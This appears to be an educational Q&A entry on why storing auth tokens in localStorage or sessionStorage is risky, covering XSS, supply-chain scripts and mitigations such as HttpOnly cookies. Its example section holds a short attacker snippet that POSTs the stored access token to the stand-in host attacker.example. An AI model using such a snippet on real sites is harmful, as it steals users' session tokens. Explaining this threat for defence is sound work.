---
title: "What are the risks of storing tokens in localStorage/sessionStorage?"
tags: ["security", "localstorage", "xss", "tokens"]
difficulty: "easy"
---

## Short answer

Anything in `localStorage` or `sessionStorage` is readable by every script running on your origin. One XSS bug, a compromised npm package, or a malicious browser extension can read the token and send it to an attacker, who can then use it from their own machine until it expires. `localStorage` also persists forever with no expiry, and neither storage gives you HttpOnly-style protection.

## Explanation

Web Storage is a drawer in your desk with no lock. Anyone who walks into the office (any script on the page) can open it. An HttpOnly cookie is a safe the browser holds; scripts can use the office phone, but cannot copy the key and walk away with it.

### The main risks

| Risk | Why it matters |
|---|---|
| XSS token theft | `localStorage.getItem("token")` is one line for an attacker |
| Supply-chain attacks | Any third-party script (analytics, chat widget, npm dependency) runs with the same access |
| Persistence | `localStorage` survives browser restarts; a stolen long-lived token works for days |
| Shared machines | Tokens remain after the user closes the tab (localStorage) |
| No scoping | Unlike cookies, you cannot limit by path, `Secure`, or `SameSite` |
| Synchronous API | Not a security issue, but blocks the main thread and is unavailable in Web Workers |

### Theft vs abuse

The key distinction: with HttpOnly cookies, an XSS attacker can still **act as the user while the page is open**, but cannot **steal** the credential and reuse it later from elsewhere. With localStorage they can do both. Theft is worse because it outlives the bug fix.

### sessionStorage is only slightly better

It is cleared when the tab closes and is not shared across tabs, which reduces the window, but it is just as readable by XSS.

## Example

```js
// What an attacker's injected script needs to do. That's all.
fetch("https://attacker.example/steal", {
  method: "POST",
  body: JSON.stringify({
    token: localStorage.getItem("accessToken"),
    origin: location.origin,
  }),
});
```

If you must use Web Storage (legacy API, no backend control), reduce the blast radius:

```js
// shortcut: in-memory token with no persistence; user re-auths on reload
let accessToken = null;
export const setToken = (t) => { accessToken = t; };
export const getToken = () => accessToken;
```

Combine that with very short token lifetimes, refresh token rotation, a strict CSP, and minimal third-party scripts.

## Common mistakes

- Believing "my app has no XSS so localStorage is fine". You are trusting every dependency forever.
- Encrypting the token before putting it in localStorage. The decryption key is in the same JavaScript, so this adds nothing.
- Storing user PII or roles in localStorage and trusting them for authorization on the client.
- Never clearing storage on logout.

## Follow-up questions

- **Is localStorage ever acceptable for tokens?** For low-risk apps with short-lived tokens and a strong CSP, some teams accept it, but you should state the trade-off explicitly.
- **What can safely go in localStorage?** Non-sensitive UI preferences: theme, language, dismissed banners, draft text that is not private.
- **Does HttpOnly fully solve XSS?** No. It prevents token exfiltration, not the attacker acting in the live session. Fixing XSS is still required.

## Quick recap

- Web Storage is readable by any script on the origin.
- XSS or a bad dependency equals token theft.
- Stolen tokens work from anywhere until they expire.
- Prefer HttpOnly cookies or in-memory tokens with short lifetimes.
